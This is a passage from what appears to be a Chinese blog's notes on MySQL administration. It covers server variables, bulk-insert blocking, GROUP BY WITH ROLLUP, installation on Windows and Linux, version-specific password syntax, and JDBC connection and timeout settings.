selec <span class="token operator">*</span> <span class="token keyword">from</span> processlist<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="查看系统运行状态">查看系统运行状态</h2>
<p>性能优化的时候可参考</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">status</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="系统参数配置">系统参数配置</h2>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> variables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="最大连接数">最大连接数</h2>
<p>查看</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> @<span class="token variable">@global.max_connections</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>修改</p>
<pre class="line-numbers language-none"><code class="language-none">set global max_connections=1024;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="配置-sql-mode">配置 sql_mode</h2>
<p>查看</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 全局配置</span>
<span class="token keyword">select</span> @<span class="token variable">@global.sql_mode</span><span class="token punctuation">;</span> 
<span class="token comment"># 已经存在的数据库sql_mode</span>
<span class="token keyword">select</span> @<span class="token variable">@sql_mode</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>修改（建议先查后改）</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 改变已经存在的数据库sql_mode </span>
<span class="token keyword">set</span> sql_mode<span class="token operator">=</span><span class="token string">' '</span> 

<span class="token comment"># 改变全局配置sql_mode</span>
<span class="token keyword">set</span> @<span class="token variable">@global.sql_mode</span><span class="token operator">=</span><span class="token string">' '</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="系统参数总表参考">系统参数总表参考</h2>
<p>查询</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SHOW</span> VARIABLES<span class="token punctuation">;</span>
<span class="token keyword">SHOW</span> VARIABLES <span class="token operator">LIKE</span> <span class="token string">'autocommit'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="配置执行语句长度限制">配置执行语句长度限制</h2>
<p>配置不够，执行错误提示</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">ERROR:The size <span class="token keyword">of</span> <span class="token keyword">BLOB</span><span class="token operator">/</span><span class="token keyword">TEXT</span> <span class="token keyword">data</span> inserted <span class="token operator">in</span> one <span class="token keyword">transaction</span> <span class="token operator">is</span> greater than  <span class="token number">10</span><span class="token operator">%</span> <span class="token keyword">of</span> redo log size<span class="token punctuation">.</span> Increase the redo log size <span class="token keyword">using</span> innodb_log_file_size<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>查看配置</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> @<span class="token variable">@global.max_allowed_packet</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>修改配置（临时）</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">set</span> <span class="token keyword">global</span> max_allowed_packet  <span class="token operator">=</span> <span class="token number">1024</span><span class="token operator">*</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>修改配置（永久）</p>
<pre class="line-numbers language-none"><code class="language-none">在mysqld下面添加配置max_allowed_packed=1024M  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1>批量执行insert语句，进入了阻塞状态</h1>
<p>原因一：磁盤空間已滿</p>
<p>原因二：<code>innodb_flush_log_at_trx_commit</code>是配置MySql日志何时写入硬盘的参数：</p>
<ul>
<li>参数值说明</li>
</ul>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>log buffer将每秒一次地写入log file中，并且log  file的flush(刷到磁盘)操作同时进行。该模式下在事务提交的时候，不会主动触发写入磁盘的操作。<br>当设置为0，该模式速度最快，但不太安全，mysqld进程的崩溃会导致上一秒钟所有事务数据的丢失</td>
</tr>
<tr>
<td>1</td>
<td>每次事务提交时MySQL都会把log buffer的数据写入log  file，并且flush(刷到磁盘)中去，该模式为系统默认。<br><br>当设置为1，该模式是最安全的，但也是最慢的一种方式。在mysqld 服务崩溃或者服务器主机crash的情况下，binary log 只有可能丢失最多一个语句或者一个事务</td>
</tr>
<tr>
<td>2</td>
<td>每次事务提交时mysql都会把log buffer的数据写入log  file，但是flush(刷到磁盘)操作并不会同时进行。<br>该模式下，MySQL会每秒执行一次 flush(刷到磁盘)操作<br><br>当设置为2，该模式速度较快，也比0安全，只有在操作系统崩溃或者系统断电的情况下，上一秒钟所有事务数据才可能丢失</td>
</tr>
</tbody>
</table>
<p>解决</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">innodb_flush_log_at_trx_commit<span class="token operator">=</span><span class="token number">2</span>，sync_binlog<span class="token operator">=</span><span class="token number">500</span> 或<span class="token number">1000</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>​		查找资料时候看到其他文章说innodb_flush_log_at_trx_commit和sync_binlog 两个参数是控制MySQL 磁盘写入策略以及数据安全性的关键参数，当两个参数都设置为1的时候写入性能最差。</p>
<p>​		推荐做法是innodb_flush_log_at_trx_commit=2，sync_binlog=500 或1000</p>
<h1>表联合查询</h1>
<h2 id="两个数据表的关联">两个数据表的关联</h2>
<p><strong>USING(userid, unit_id)</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 使用 USING：关联字段一致</span>
<span class="token keyword">SELECT</span> claim<span class="token punctuation">.</span>userid<span class="token punctuation">,</span> person<span class="token punctuation">.</span>real_name
<span class="token keyword">FROM</span> ware_resouce_info_claim  claim
<span class="token keyword">LEFT</span> <span class="token keyword">JOIN</span> personal_userinfo person <span class="token keyword">USING</span><span class="token punctuation">(</span>userid<span class="token punctuation">,</span> unit_id<span class="token punctuation">)</span> <span class="token punctuation">;</span>


<span class="token comment"># 使用字段组合</span>
<span class="token keyword">SELECT</span> claim<span class="token punctuation">.</span>userid<span class="token punctuation">,</span> person<span class="token punctuation">.</span>real_name
<span class="token keyword">FROM</span> ware_resouce_info_claim claim
<span class="token keyword">LEFT</span> <span class="token keyword">JOIN</span> personal_userinfo person <span class="token keyword">ON</span> person<span class="token punctuation">.</span>userid <span class="token operator">=</span> claim<span class="token punctuation">.</span>userid<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="GROUP-BY-…-WITH-ROLLUP">GROUP BY … WITH ROLLUP</h2>
<p>加上<code>WITH ROLLUP</code>关键字的效果是MySQL将在查询结果的最后一-行将自动增加一条总数统计记录，这条记录的ID字段取值或者说这条记录的名字永远是NULL.</p>
<ol>
<li>
<p>如下所示：</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> document_type_id<span class="token punctuation">,</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> 
<span class="token keyword">FROM</span> resource_info
<span class="token keyword">GROUP</span> <span class="token keyword">BY</span> document_type_id <span class="token keyword">WITH ROLLUP</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230418140341120.png" alt="image-20230418140341120"></p>
</li>
<li>
<p>GROUP BY 结果中有NULL 的聚类项</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> document_type_id<span class="token punctuation">,</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> 
<span class="token keyword">FROM</span> resource_info 
<span class="token keyword">GROUP</span> <span class="token keyword">BY</span> document_type_id <span class="token keyword">WITH ROLLUP</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230418140852053.png" alt="image-20230418140852053"></p>
</li>
<li>
<p>多个聚类项目：按照每个聚类项统计（小计和总计的概念）</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> document_type_id<span class="token punctuation">,</span> department_id<span class="token punctuation">,</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> 
<span class="token keyword">FROM</span> resource_info 
<span class="token keyword">GROUP</span> <span class="token keyword">BY</span> document_type_id<span class="token punctuation">,</span> department_id
<span class="token keyword">WITH ROLLUP</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230418142243995.png" alt="image-20230418142243995"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL安装、版本差异、JDBC连接配置</title>
    <url>/20221031/4c28b48e.html</url>
    <content><![CDATA[<h1>Windows安装（5.6）</h1>
<ol>
<li>
<p>. 准备</p>
<p>拷贝文件夹：mysql-5.6.10-winx64到D:\ chaoxing \ software \目录下</p>
</li>
<li>
<p>环境变量</p>
<p>MYSQL_HOME: D:\ chaoxing \ software \ mysql-5.6.10-winx64（新建）</p>
<p>path追加：;%MYSQL_HOME%\bin</p>
</li>
<li>
<p>安装服务，并启动</p>
<p>启动cmd：进入目录D:\ chaoxing \ software \ mysql-5.6.10-winx64\bin</p>
<p>运行：mysqld install MySQL</p>
<p>启动：net start MySQL</p>
</li>
<li>
<p>修改数据库密码</p>
<p>启动cmd：进入目录D:\ chaoxing \ software \ mysql-5.6.10-winx64\bin</p>
<p>运行：mysql –u root</p>
</li>
</ol>
<p>mysql&gt;show databases;</p>
<p>mysql&gt;use mysql;</p>
<p>mysql&gt;UPDATE user SET password=PASSWORD(“<strong>自定义密码</strong>”) WHERE user=‘root’;</p>
<p>mysql&gt;FLUSH PRIVILEGES;</p>
<p>mysql&gt;QUIT</p>
<h1>LINUX安装</h1>
<h2 id="准备工作">准备工作</h2>
<ol>
<li>
<p>下载MySQL安装包</p>
<p>下载路径：<code>https://dev.mysql.com/downloads/mirrors/</code>，点左侧，Other Downloads，选择需要的镜像下载。</p>
<p>选择版本：mysql-5.7.23-linux-glibc2.12-x86_64.tar.gz</p>
<p>或者：<code>wget https://dev.mysql.com/get/Downloads/MySQL-5.7/mysql-5.7.23-linux-glibc2.12-x86_64.tar.gz</code>直接下载</p>
</li>
<li>
<p>上传&amp; 解压  （rz -y 上传）压缩包存放路径：/opt</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> mysql-5.7.23-linux-glibc2.12-x86_64.tar.gz
<span class="token function">mv</span> mysql-5.7.23-linux-glibc2.12-x86_64 mysql-5.7.23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
</ol>
<h2 id="安装MySQL">安装MySQL</h2>
<ol>
<li>
<p>安装依赖</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> <span class="token parameter variable">-y</span> cmake <span class="token function">make</span> gcc gcc-c++ libaio ncurses ncurses-devel<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>添加系统mysql组和mysql用户</p>
</li>
</ol>
<p>​		添加系统mysql组 <code>groupadd mysql</code></p>
<p>​		添加mysql用户<code>useradd -r -g mysql mysql</code>（添加完成后可用id mysql查看）</p>
<ol start="3">
<li>安装数据库</li>
</ol>
<p>​		切到mysql目录： <code>cd /opt/mysql-5.7.23</code></p>
<p>​		修改当前目录拥有者为mysql用户：<code> chown -R mysql:mysql ./</code></p>
<p>​		安装数据库<code>bin/mysqld --initialize --user=mysql --basedir=/opt/mysql-5.7.23 --datadir=/opt/mysql-5.7.23/data</code>，  保存临时密码：<em>123123123123</em></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">可能报这个错

bin/mysqld: error <span class="token keyword">while</span> loading shared libraries: *libaio.so.1:* cannot <span class="token function">open</span> shared object file: No such <span class="token function">file</span> or directory

解决方法
yum <span class="token function">install</span> <span class="token parameter variable">-y</span> libaio //安装后在初始化<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​		执行以下命令创建RSA private key</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bin/mysql_ssl_rsa_setup <span class="token parameter variable">--datadir</span><span class="token operator">=</span>/opt/mysql-5.7.23/data<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>​		修改当前目录拥有者为mysql用户 <code>chown -R mysql:mysql ./</code></p>
<p>​		修改当前data目录拥有者为mysql用户 <code>chown -R mysql:mysql data</code></p>
<ol start="4">
<li>
<p>配置my.cnf</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vi</span> /etc/my.cnf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties">[mysqld]
<span class="token key attr-name">character_set_server</span><span class="token punctuation">=</span><span class="token value attr-value">utf8</span>
<span class="token key attr-name">init_connect</span><span class="token punctuation">=</span><span class="token value attr-value">'SET NAMES utf8'</span>
<span class="token key attr-name">basedir</span><span class="token punctuation">=</span><span class="token value attr-value">/opt/mysql-5.7.23</span>
<span class="token key attr-name">datadir</span><span class="token punctuation">=</span><span class="token value attr-value">/opt/mysql-5.7.23/data</span>
<span class="token key attr-name">socket</span><span class="token punctuation">=</span><span class="token value attr-value">/tmp/mysql.sock</span>

<span class="token comment">#不区分大小写</span>
<span class="token key attr-name">lower_case_table_names</span> <span class="token punctuation">=</span> <span class="token value attr-value">1</span>

<span class="token comment">#不开启sql严格模式</span>
<span class="token key attr-name">sql_mode</span><span class="token punctuation">=</span><span class="token value attr-value">"STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION"</span>

<span class="token key attr-name">log-error</span><span class="token punctuation">=</span><span class="token value attr-value">/var/log/mysqld.log</span>
<span class="token key attr-name">pid-file</span><span class="token punctuation">=</span><span class="token value attr-value">/opt/mysql-5.7.23/data/mysqld.pid</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>添加开机启动项</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /opt/mysql-5.7.23/support-files/mysql.server /etc/init.d/mysqld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>修改 ：  <code>vi /etc/init.d/mysqld </code></p>
<p>添加路径</p>
<pre class="line-numbers language-pr" data-language="pr"><code class="language-pr">basedir=/opt/mysql-5.7.23
datadir=/opt/mysql-5.7.23/data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p>启动mysql  ：<code>service mysqld start </code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">加入开机起动 ： <span class="token variable"><span class="token variable">`</span> <span class="token function">chkconfig</span> <span class="token parameter variable">--add</span> mysqld  <span class="token variable">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>登录修改密码 ：<code>mysql -uroot -p 上面初始化时的密码</code>（123123123123）</p>
</li>
</ol>
<p>​		如果出现错误 需要添加软连接： <code> ln -s /opt/mysql-5.7.23/bin/mysql /usr/bin</code></p>
<p>​		或者，修改环境变量。</p>
<p>​         <img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image001-16382968264995.png" alt="img"></p>
<p>​       第一件事先修改密码：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql<span class="token operator">&gt;</span>alter user <span class="token string">'root'</span>@<span class="token string">'localhost'</span> identified by <span class="token string">'修改后的密码'</span><span class="token punctuation">;</span>  

mysql<span class="token operator">&gt;</span>flush privileges<span class="token punctuation">;</span>  <span class="token comment">#刷新权限</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<ol start="7">
<li>
<p>重启后执行，如果看到有监听说明服务启动了：<code>netstat -na | grep 3306</code></p>
</li>
<li>
<p>防火墙</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 设置</span>
firewall-cmd <span class="token parameter variable">--zone</span><span class="token operator">=</span>public --add-port<span class="token operator">=</span><span class="token number">3306</span>/tcp <span class="token parameter variable">--permanent</span>

<span class="token comment"># 重新载入</span>
firewall-cmd <span class="token parameter variable">--reload</span>

<span class="token comment"># 查看</span>
firewall-cmd <span class="token parameter variable">--zone</span><span class="token operator">=</span> public --query-port<span class="token operator">=</span><span class="token number">3306</span>/tcp 
或 
firewall-cmd <span class="token parameter variable">--zone</span><span class="token operator">=</span>public --list-ports<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>设置mysql的远程登录</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># grant all privileges on 库.表 to 用户@'%' identified by '修改后的密码';</span>

mysql<span class="token operator">&gt;</span> <span class="token keyword">grant</span> <span class="token keyword">all</span> <span class="token keyword">privileges</span> <span class="token keyword">on</span> <span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">to</span> root<span class="token variable">@'%'</span> identified <span class="token keyword">by</span> <span class="token string">'root密码'</span><span class="token punctuation">;</span>

mysql<span class="token operator">&gt;</span> flush <span class="token keyword">privileges</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<h1>版本差异</h1>
<h2 id="修改密码">修改密码</h2>
<p>MySQL5.6，</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> <span class="token keyword">user</span> <span class="token keyword">SET</span> password<span class="token operator">=</span>PASSWORD<span class="token punctuation">(</span><span class="token string">"gese45ew&amp;20"</span><span class="token punctuation">)</span> <span class="token keyword">WHERE</span> <span class="token keyword">user</span><span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>MySQL5.7</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">update</span> <span class="token keyword">user</span> <span class="token keyword">set</span> authentication_string <span class="token operator">=</span> password<span class="token punctuation">(</span><span class="token string">'gese45ew&amp;20'</span><span class="token punctuation">)</span> <span class="token punctuation">,</span> password_expired <span class="token operator">=</span> <span class="token string">'N'</span><span class="token punctuation">,</span> password_last_changed <span class="token operator">=</span> <span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">where</span> <span class="token keyword">user</span> <span class="token operator">=</span> <span class="token string">'root'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="创建索引">创建索引</h2>
<p>因为，MySQL5.5和MySQL5.0 之间，建索引的语句不一样 所以，直接拷贝5.5的sql语句，不能在5.0上运行</p>
<p>方法：</p>
<ol>
<li>
<p>删除索引之后，再拷贝数据</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> consult_userinfo <span class="token keyword">DROP</span> <span class="token keyword">INDEX</span> idx_user_info_userid <span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>在5.0的数据库建索引</p>
<p>例如：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> idx_user_info_userid <span class="token keyword">on</span> test_table <span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>userid<span class="token punctuation">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> index_author <span class="token keyword">on</span> test_table<span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>author<span class="token punctuation">`</span></span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> index_orderid <span class="token keyword">on</span> test_table<span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span><span class="token punctuation">,</span><span class="token identifier"><span class="token punctuation">`</span>orderid<span class="token punctuation">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>5.5建索引</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> <span class="token identifier"><span class="token punctuation">`</span>test_table<span class="token punctuation">`</span></span> <span class="token keyword">ADD</span> <span class="token keyword">INDEX</span> index_name <span class="token punctuation">(</span> <span class="token identifier"><span class="token punctuation">`</span>column1<span class="token punctuation">`</span></span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>column2<span class="token punctuation">`</span></span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>column3<span class="token punctuation">`</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<h1>JDBC连接配置</h1>
<h2 id="JDBC连接配置参数（5-7）">JDBC连接配置参数（5.7）</h2>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
<th>默认值</th>
<th>常用值</th>
</tr>
</thead>
<tbody>
<tr>
<td>autoReconnect</td>
<td>自动连接</td>
<td>false</td>
<td>true</td>
</tr>
<tr>
<td>autoReconnectForPools</td>
<td>自动连接连接池</td>
<td>false</td>
<td>true</td>
</tr>
<tr>
<td>characterEncoding</td>
<td>当useUnicode=true时，指定字符集</td>
<td></td>
<td>UTF-8</td>
</tr>
<tr>
<td>allowMultiQueries</td>
<td>在一条语句中，允许使用“;”来分隔多条查询</td>
<td>false</td>
<td>true</td>
</tr>
<tr>
<td>failOverReadOnly</td>
<td>在autoReconnect模式下出现故障切换时，是否应将连接设置为“只读”</td>
<td>true</td>
<td>false</td>
</tr>
<tr>
<td>useSSL</td>
<td>与服务器进行通信时使用SSL</td>
<td>true</td>
<td>false</td>
</tr>
<tr>
<td>useUnicode</td>
<td>是否使用Unicode</td>
<td>false</td>
<td>true</td>
</tr>
<tr>
<td>socketTimeout</td>
<td>数据库无返回时，应用等待时间（ms）。要大于等于数据库配置的Socket TimeOut的值</td>
<td>0</td>
<td>60000</td>
</tr>
<tr>
<td>serverTimezone</td>
<td>配置时区</td>
<td>系统时区</td>
<td>Asia/Shanghai <br>GMT%2B8</td>
</tr>
<tr>
<td>zeroDateTimeBehavior</td>
<td>配置空值存入DataTime<br><br>1.	exception：默认值，即抛出SQL state [S1009]. Cannot convert value…的异常<br>2.	convertToNull：将日期转换成NULL值<br><br>3.	round：替换成最近的日期即0001-01-01</td>
<td>exception</td>
<td>convertToNull</td>
</tr>
</tbody>
</table>
<p>时区异常处理</p>
<p>错误信息</p>
<pre class="line-numbers language-none"><code class="language-none">…  is unrecognized or represents more than one time zone<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>配置时区</p>
<pre class="line-numbers language-none"><code class="language-none">jdbc:mysql://localhost:3306/db?useUnicode=true&amp;characterEncoding=UTF-8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=false&amp;serverTimezone=Asia/Shanghai<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="数据库客户端超时设置">数据库客户端超时设置</h2>
<p>数据库客户端的超时主要可以分为JDBC超时/连接池超时/Statement超时/事务超时等。</p>
<h3 id="超时配置的关系和层级示意图">超时配置的关系和层级示意图</h3>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/be1022af-1837-42c2-ae32-9d7e0ec4aa2c.png" alt="img"></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/43530e52-774a-401b-8e8c-0e10e2cc0fdc.png" alt="img"></p>
<p>上图中，更上层的超时依赖于下层的超时，只有当较低层的超时机制正常工作，上层的超时才会正常。如果 JDBC 驱动程序的socket超时工作不正常，那么更上层的超时比如 Statement 超时和事务超时都不会正常工作。</p>
<h3 id="Transaction-Timeout-事务超时">Transaction Timeout(事务超时)</h3>
<p>​		transaction timeout一般存在于框架（Spring, EJB）或应用级。transaction timeout或许是个相对陌生的概念，简单地说，transaction timeout就是“statement Timeout * N（需要执行的statement数量） + @（垃圾回收等其他时间）”。</p>
<p>​		transaction timeout用来限制执行statement的总时长。</p>
<p>​		例如：假设执行一个statement需要0.1秒，那么执行少量statement不会有什么问题，但若是要执行100,000个statement则需要10,000秒（约7个小时）。这时，transaction timeout就派上用场了。EJB CMT (Container Managed Transaction)就是一种典型的实现，它提供了多种方法供开发者选择。但我们并不使用EJB，Spring的transaction timeout设置会更常用一些。在Spring中，你可以使用下面展示的XML或是在源码中使用@Transactional注解来进行设置。</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">tx:</span>attributes</span><span class="token punctuation">&gt;</span></span>  
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">tx:</span>method</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>…<span class="token punctuation">"</span></span> <span class="token attr-name">timeout</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>  
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">tx:</span>attributes</span><span class="token punctuation">&gt;</span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>​		Spring提供的transaction timeout配置非常简单，它会记录每个事务的开始时间和消耗时间，当特定的事件发生时就会对消耗时间做校验，当超出timeout值时将抛出异常。</p>
<p>Spring中，被保存在ThreadLocal里，这被称为事务同步（Transaction Synchronization），与此同时，事务的开始时间和消耗时间也被保存下来。当使用这种代理连接创建statement时，就会校验事务的消耗时间。EJB CMT的实现方式与之类似，其结构本身也十分简单。</p>
<p>当你选用的容器或框架并不支持transaction timeout这一特性，你可以考虑自己来实现。transaction timeout并没有标准的API。Lucy框架的1.5和1.6版本都不支持transaction timeout，但是你可以通过使用Spring的Transaction Manager来达到与之同样的效果。</p>
<p>假设某个事务中包含5个statement，每个statement的执行时间是200ms，其他业务逻辑的执行时间是100ms，那么transaction timeout至少应该设置为1,100ms（200 * 5 + 100）。</p>
<h3 id="Statement-Timeout">Statement Timeout</h3>
<p>​		statement timeout用来限制statement的执行时长，timeout的值通过调用JDBC的.sql.Statement.setQueryTimeout(int timeout) API进行设置。不过现在开发者已经很少直接在代码中设置，而多是通过框架来进行设置。</p>
<p>以iBatis为例，statement timeout的默认值可以通过<strong>map-config.xml</strong>中的<strong>defaultStatementTimeout</strong> 属性进行设置。同时，你还可以设置sqlmap中select，insert，update标签的timeout属性，从而对不同sql语句的超时时间进行独立的配置。</p>
<p>如果你使用的是Lucy1.5或1.6版本，通过设置<strong>queryTimeout</strong>属性可以在datasource层面对statement timeout进行设置。</p>
<p>statement timeout的具体值需要依据应用本身的特性而定，并没有可供推荐的配置</p>
<h4 id="QueryTimeout处理过程">QueryTimeout处理过程</h4>
<ol>
<li>
<p>通过调用Connection的createStatement()方法创建statement</p>
</li>
<li>
<p>调用<strong>statement</strong>的executeQuery()方法</p>
</li>
<li>
<p><strong>statement</strong>通过自身connection将query发送给MySQL数据库</p>
</li>
<li>
<p><strong>statement</strong>创建一个新的timeout-execution线程用于超时处理</p>
</li>
<li>
<p>5.1版本后改为每个connection分配一个timeout-execution线程</p>
</li>
<li>
<p>向timeout-execution线程进行注册</p>
</li>
<li>
<p>达到超时时间</p>
</li>
<li>
<p>TimerThread调用JtdsStatement实例中的TsdCore.cancel()方法</p>
</li>
<li>
<p>timeout-execution线程创建一个和statement配置相同的connection</p>
</li>
<li>
<p>使用新创建的connection向超时query发送cancel query（KILL QUERY “connectionId”）</p>
</li>
</ol>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211201004107227.png" alt="image-20211201004107227"></p>
<h3 id="JDBC的socket-timeout">JDBC的socket timeout</h3>
